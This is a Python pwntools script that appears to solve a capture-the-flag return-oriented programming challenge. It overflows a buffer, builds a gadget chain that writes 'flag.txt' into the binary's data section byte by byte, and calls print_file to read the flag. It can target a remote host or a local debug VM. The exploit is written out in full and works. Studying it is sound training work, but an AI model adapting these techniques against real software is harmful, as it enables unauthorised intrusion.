#!/usr/bin/env python3

from argparse import ArgumentParser
from pwn import *


def get_proc(gdb_script=""):
    """
    Get the tube specified by command line arguments.
    """
    return _get_proc(*parse_args(), gdb_script)


def parse_args():
    """
    Parse command line arguments.
    """
    parser = ArgumentParser(description="pwn/re template")
    parser.add_argument("executable", type=str, help="path to executable")
    parser.add_argument("remote", default=[None, None], nargs="*", help="remote hostname and port")
    args = parser.parse_args()
    host, port = parse_remote(args.remote)
    return args.executable, host, port


def parse_remote(remote):
    """
    Validate command line arguments.
    """
    if isinstance(remote, str):
        remote = remote.split(":")
    try:
        host, port = remote
    except ValueError:
        raise ValueError("host and port required to use remote")
    return host, port


def _get_proc(executable, host, port, gdb_script):
    """
    Get a remote tube if host/port specified, otherwise a gdb-over-ssh tube to
    a VM/Docker environment.
    """
    context.binary = executable
    context.terminal = ['gnome-terminal', '--tab', '-e']
    if host is not None or port is not None:
        if host is None or port is None: 
            raise ValueError("both host and port must be specified for remote")
        proc = remote(host, port)
    else:        
        proc = gdb.debug(
            exe=executable,
            gdbscript=gdb_script,
            args=[executable],
            ssh=ssh('test','localhost', 2222, "test", ignore_config=True)
        )
    return proc


def get_copy_chain(src_addr, dst_addr, al_value):
    # copy 64 bits, starting at bit 0, from rcx to rbx
    payload = p64(0x40062a) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
    payload += p64(0x4000) # 64 bits, starting at index 0
    payload += p64(src_addr - 0x3ef2 - al_value) # src_addr - constant in gadget - value of AL

    # AL = byte[rbx + AL]
    payload += p64(0x400628) # xlat; ret;
    
    # copy byte at src_addr into dst_addr
    payload += p64(0x4006a3) # pop rdi; ret;
    payload += p64(dst_addr)
    payload += p64(0x400639) # stosb byte ptr [rdi], al; ret; 
    return payload
   

def get_addr_of_char(char):
    return next(context.binary.search(char))


def main():
    gdb_script="""
    b *0x40062a
    """
    p = get_proc(gdb_script)
    payload = b"a" * cyclic_find(0x6161616161616166, n=8)

    al_value = 0xb
    for idx, char in enumerate(b"flag.txt"):
        payload += get_copy_chain(
            get_addr_of_char(char),
            context.binary.sym.data_start + idx,
            al_value,
        )
        al_value = char

    payload += p64(0x4006a3) # pop rdi; ret;
    payload += p64(context.binary.sym.data_start)
    payload += p64(context.binary.sym.print_file)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
